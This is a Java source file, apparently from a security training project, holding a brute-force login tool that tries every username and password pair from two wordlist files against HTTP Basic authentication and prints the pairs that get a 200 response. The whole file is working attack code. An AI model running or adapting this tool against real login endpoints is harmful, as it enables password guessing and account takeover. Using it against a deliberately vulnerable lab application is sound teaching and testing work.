package com.joshcummings.codeplay.tools;

import com.joshcummings.codeplay.terracotta.testng.HttpSupport;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.RequestBuilder;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;

public class BruteForceLogin {
	private static HttpSupport http = new HttpSupport();
	private static Base64.Encoder encoder = Base64.getEncoder();

	private static class Result {
		String username;
		String password;
		int status;

		public Result(String username, String password, int status) {
			this.username = username;
			this.password = password;
			this.status = status;
		}

		public void print() {
			String message = String.format("%s:%s -> %d", this.username, this.password, this.status);
			if ( this.status == 200 ) {
				System.out.println(message);
			}
		}
	}

	private static Result login(String username, String password) {
		String up = encoder.encodeToString((username + ":" + password).getBytes());

		try (CloseableHttpResponse response =
				http.getForEntity(RequestBuilder.get("/")
					.addHeader("Authorization", "Basic " + up)) ){

			int status = response.getStatusLine().getStatusCode();

			return new Result(username, password, status);
		} catch ( Exception e ) {
			e.printStackTrace();
			return new Result(username, password, -1);
		}
	}

	public static void main(String[] args) throws IOException {
		try (
				BufferedReader passwords = new BufferedReader(
						new FileReader(args[1]));
				) {

			List<String> usernames = Files.readAllLines(Paths.get(args[0]));
			for ( String username : usernames ) {
				passwords.lines()
						.map(password -> login(username, password))
						.forEach(Result::print);
			}
		}
	}
}
